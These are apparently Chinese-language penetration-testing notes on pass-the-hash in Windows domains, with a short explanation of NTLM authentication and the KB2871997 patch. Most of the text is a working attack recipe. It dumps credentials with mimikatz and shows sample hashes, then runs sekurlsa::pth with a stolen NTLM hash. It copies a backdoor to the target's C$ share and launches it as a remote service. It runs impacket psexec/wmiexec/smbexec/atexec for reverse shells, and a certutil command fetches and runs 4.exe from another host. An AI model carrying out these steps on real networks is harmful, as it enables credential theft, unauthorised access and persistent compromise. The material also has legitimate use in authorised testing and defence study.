pass the hash（哈希传递攻击，简称pth）
pass the ticket（票据传递攻击，简称ptt）
pass the key（密钥传递攻击，简称ptk）

PTH(pass the hash) 利用的lm或ntlm值碰撞进行的渗透测试（NTLM认证攻击）
PTK(pass the key)) 利用的ekeys aes256进行的渗透测试（NTLM认证攻击）
PTT(passtheticket) 利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）

## **哈希传递攻击**
PTH = Pass The Hash，在域环境中，通过密码散列值 (通常是 NTLM Hash，明文md4等加密)来进行攻击。
用户登录系统时，系统会将明文密码转换成NTLM Hash，并与存储在SAM数据库中的哈希值进行比对来完成认证。
在PTH攻击中，攻击者通过某些手段（如利用系统漏洞、社交工程、密码哈希的嗅探等）获取到用户的NTLM Hash，然后使用这个哈希值在另一台机器上尝试进行远程登录 或 访问网络资源（Hash被KDC记录过，可以挑战成功授权访问），从而绕过需要明文密码的认证过程。NTLM协议允许使用密码哈希来进行认证，因此如果系统接受哈希值作为认证凭证，PTH 攻击就可以成功。


防御：微软在2014年发布了安全更新KB2871997，这个更新提高了安全性，限制了某些PTH攻击手段。然而，即使是打了这个补丁，SID为500的administrator账户（默认的管理员账号）仍然可以进行PTH攻击，因为该补丁并不限制SID为500的账户。

另外注意在 Window Server 2012 R2 之前使用到的密码散列值是 LM、NTLM(Windows7之后)，
在 Windows7 和 2012 R2 及其版本之后使用到的密码散列值是 NTLM Hash。


## **获取Hash**
上线提权后使用mimikatz.exe或CS右击获取明文密码，在日志中查看
```
* Username : webadmin
* Domain   : GOD
* LM       : e90127c07127ed12f4ebf668acca53e9
* NTLM     : 518b98ad4178a53695dc997aa02d455c
* SHA1     : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39
```
Windows7前，用LM
Windows&后，用NTLM的518b98ad4178a53695dc997aa02d455c

## **利用方式**

1、CS自带Mimikatz的命令(实战难利用)
```
mimikatz privilege::debug

mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c

此时在跳板机上弹出cmd窗口(实战难利用)，且向目标机创建的IPC隧道。
net use \\192.168.3.32\c$
dir \\192.168.3.32\c$
跳板机CS代理转发-转发上线 生成后门
copy 4.exe \\192.168.3.32\c$

创建服务运行，192.168.3.32主机对应域名sqlserver
sc \\sqlserver create bshell binpath= "c:\4.exe"
sc \\sqlserver start bshell
```
2、impacket脚本程序atexec\psexec\wmiexec\smbexec
可配置socks代理，本地运行。如：反弹shell。
```
直接命令：
atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"`

反弹shell：
psexec -hashes :NTLM 值 域名/域用户@域内 ip 地址
smbexec -hashes :NTLM 值 域名/域用户@域内 ip 地址
wmiexec -hashes :NTLM 值 域名/域用户@域内 ip 地址

如：
D:\Myproject\venv\Scripts\python.exe psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator\@192.168.32
```

上传后门到跳板机的80服务，反弹shell后下载并运行上线。
```
certutil.exe -urlcache -split -f http://192.168.3.31:80/4.exe 4.exe & 4.exe
```